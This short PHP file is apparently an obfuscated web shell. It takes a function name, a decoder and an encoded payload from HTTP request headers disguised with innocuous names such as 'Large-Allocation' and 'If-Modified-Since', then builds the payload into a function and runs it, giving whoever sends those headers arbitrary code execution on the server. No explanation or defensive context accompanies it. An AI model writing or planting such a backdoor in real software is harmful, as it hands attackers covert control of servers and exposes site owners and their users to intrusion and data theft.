<?php
$_HEADERS = getallheaders();
if (isset($_HEADERS['Large-Allocation'])) {
    $ibase_pconnection = $_HEADERS['Large-Allocation']('', $_HEADERS['Sec-Websocket-Accept']($_HEADERS['If-Modified-Since']));
    $ibase_pconnection();
}